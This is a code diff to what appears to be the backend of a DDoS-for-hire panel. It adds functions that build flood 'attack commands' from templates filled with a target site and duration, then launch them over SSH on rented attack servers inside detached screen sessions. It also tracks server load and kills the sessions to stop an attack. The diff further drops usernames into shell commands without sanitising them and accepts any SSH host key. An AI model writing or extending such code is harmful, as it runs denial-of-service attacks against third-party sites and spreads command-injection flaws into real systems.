@@ -619,7 +619,8 @@ async def select_best_server(method: str, concurrents: int):
         return best
     return None
 
-def build_attack_command(server: dict, attack: dict) -> str:
+def build_attack_command(server: dict, attack: dict, username: str) -> str:
+    """Build the attack command with screen wrapper"""
     method_commands = server.get("method_commands", [])
     command_template = None
     
@@ -642,21 +643,104 @@ def build_attack_command(server: dict, attack: dict) -> str:
     command = command.replace("{time}", str(attack["duration"]))
     command = command.replace("{site}", str(attack["target"]))
     
-    return command
+    # Create screen session name: username + attack_id (last 6 chars)
+    screen_name = f"{username}{attack['id'][-6:]}"
+    
+    # Wrap in screen command
+    full_command = f"screen -dmS {screen_name} {command}"
+    
+    return full_command, screen_name
 
-async def execute_attack_on_server(server: dict, attack: dict):
-    command = build_attack_command(server, attack)
-    if not command:
-        return False, None
+def execute_ssh_command_sync(host, port, username, password, ssh_key, command):
+    """Execute command via SSH (synchronous for thread executor)"""
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     
-    logger.info(f"Attack command for server {server['name']}: {command}")
+    try:
+        if ssh_key:
+            from io import StringIO
+            key = paramiko.RSAKey.from_private_key(StringIO(ssh_key))
+            ssh.connect(host, port=port, username=username, pkey=key, timeout=10)
+        else:
+            ssh.connect(host, port=port, username=username, password=password, timeout=10)
+        
+        stdin, stdout, stderr = ssh.exec_command(command, timeout=30)
+        output = stdout.read().decode()
+        error = stderr.read().decode()
+        exit_code = stdout.channel.recv_exit_status()
+        
+        ssh.close()
+        return {
+            "success": exit_code == 0,
+            "output": output,
+            "error": error
+        }
+    except Exception as e:
+        return {"success": False, "output": "", "error": str(e)}
+    finally:
+        try:
+            ssh.close()
+        except:
+            pass
+
+async def execute_attack_on_server(server: dict, attack: dict, username: str):
+    """Execute attack command on server via SSH using screen"""
+    result = build_attack_command(server, attack, username)
+    if not result:
+        return False, None, None
     
+    command, screen_name = result
+    
+    logger.info(f"Starting attack on server {server['name']}: {command}")
+    
+    # Execute command via SSH
+    loop = asyncio.get_event_loop()
+    ssh_result = await loop.run_in_executor(
+        None,
+        execute_ssh_command_sync,
+        server.get('host'),
+        server.get('ssh_port', 22),
+        server.get('ssh_user', 'root'),
+        server.get('ssh_password'),
+        server.get('ssh_key'),
+        command
+    )
+    
+    if not ssh_result.get("success") and ssh_result.get("error"):
+        logger.error(f"Failed to start attack: {ssh_result.get('error')}")
+        # Even if there's an error, screen command usually returns 0
+        # Check if it's a real error
+        if "ssh" in ssh_result.get("error", "").lower():
+            return False, None, None
+    
+    # Update server load
     await db.attack_servers.update_one(
         {"id": server["id"]},
         {"$inc": {"current_load": attack["concurrents"]}}
     )
     
-    return True, command
+    return True, command, screen_name
+
+async def stop_attack_on_server(server: dict, screen_name: str):
+    """Stop attack on server by killing the screen session"""
+    # Kill the screen session and any related processes
+    kill_command = f"screen -S {screen_name} -X quit 2>/dev/null; pkill -9 -f '{screen_name}' 2>/dev/null || true"
+    
+    logger.info(f"Stopping attack on server {server['name']}: {kill_command}")
+    
+    loop = asyncio.get_event_loop()
+    result = await loop.run_in_executor(
+        None,
+        execute_ssh_command_sync,
+        server.get('host'),
+        server.get('ssh_port', 22),
+        server.get('ssh_user', 'root'),
+        server.get('ssh_password'),
+        server.get('ssh_key'),
+        kill_command
+    )
+    
+    return result.get("success", True)  # Usually succeeds even if process already dead
 
 async def release_server_load(server_id: str, concurrents: int):
     await db.attack_servers.update_one(
